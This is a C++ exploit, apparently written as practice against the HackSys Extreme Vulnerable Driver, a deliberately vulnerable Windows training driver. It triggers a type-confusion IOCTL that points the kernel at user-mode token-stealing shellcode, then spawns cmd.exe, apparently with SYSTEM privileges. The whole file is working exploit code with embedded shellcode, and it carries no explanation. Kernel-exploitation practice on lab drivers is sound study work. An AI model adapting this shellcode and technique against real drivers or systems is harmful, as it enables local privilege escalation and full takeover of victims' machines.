#include <iostream>
#include <windows.h>
#include <psapi.h>

// tested on Windows 7 64-bit SP1

// 
// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/d4drvif/nf-d4drvif-ctl_code
#define HACKSYS_EVD_IOCTL_TYPE_CONFUSION CTL_CODE(FILE_DEVICE_UNKNOWN, 0x808, METHOD_NEITHER, FILE_ANY_ACCESS)


#define HEVD_SYM_LINK "\\\\.\\HacksysExtremeVulnerableDriver"


// this is defined in the driver
 typedef struct _USER_TYPE_CONFUSION_OBJECT {
     ULONG_PTR ObjectID;
     ULONG_PTR ObjectType;
} USER_TYPE_CONFUSION_OBJECT, * PUSER_TYPE_CONFUSION_OBJECT, UserObject;


int main() {
    // get a handle to the driver using the Symbolic link
    HANDLE hDevice = CreateFileA(HEVD_SYM_LINK, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);

    // if CreateFileA fails the handle will be -0x1
    if (hDevice == (HANDLE)-0x1)
    {
        printf("[+] Driver handle: 0x%p\n", hDevice);
        printf("[!] Unable to get a handle to the driver.\n");
        return 1;
    }
    else
    {
        printf("[+] Driver handle: 0x%p\n", hDevice);

        // token stealing shellcode - 64bit
        const unsigned char shellcode[] = { 
            0x50, 0x53, 0x51, 0x56, 0x57, 0x48, 0x31, 0xC0, 
            0x65, 0x48, 0x8B, 0x80, 0x88, 0x01, 0x00, 0x00, 
            0x48, 0x8B, 0x40, 0x70, 0x49, 0x89, 0xC0, 0x41, 
            0xB9, 0x04, 0x00, 0x00, 0x00, 0x4D, 0x8B, 0x80, 
            0x88, 0x01, 0x00, 0x00, 0x49, 0x81, 0xE8, 0x88, 
            0x01, 0x00, 0x00, 0x4D, 0x39, 0x88, 0x80, 0x01, 
            0x00, 0x00, 0x75, 0xE9, 0x49, 0x8B, 0x88, 0x08, 
            0x02, 0x00, 0x00, 0x80, 0xE1, 0xF0, 0x48, 0x89, 
            0x88, 0x08, 0x02, 0x00, 0x00, 0x5F, 0x5E, 0x59, 
            0x5B, 0x58 
        };

        // allocate memory for the shellcode
        LPVOID alloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!alloc)
        {
            printf("[!] Unable to allocate memory for the shellcode. Error code: %d\n", GetLastError());
            return 1;
        }

        printf("[+] Memory allocated: 0x%p\n", alloc);

        // copy the shellcode in to the memory
        RtlMoveMemory(alloc, shellcode, sizeof(shellcode));
        printf("[+] Shellcode copied to: 0x%p\n", alloc);

        printf("[!] Press enter when ready...");
        getchar();

        UserObject userObject = { 0 };
        userObject.ObjectID =   (ULONG_PTR)0x4141414141414141;
        userObject.ObjectType = (ULONG_PTR)alloc;

        printf("[+] Sending buffer to IOCTL: 0x%p...\n", HACKSYS_EVD_IOCTL_TYPE_CONFUSION);

        // interact with the driver
        DeviceIoControl(hDevice, HACKSYS_EVD_IOCTL_TYPE_CONFUSION, (LPVOID)&userObject, sizeof(userObject), NULL, 0, NULL, NULL);
        printf("[+] Hopefully the magic has happened...\n");
        printf("[+] Spawning new process..\n\n");

        // spawn a new command prompt
        system("cmd.exe");

        // close the driver handle
        CloseHandle(hDevice);
    }
}
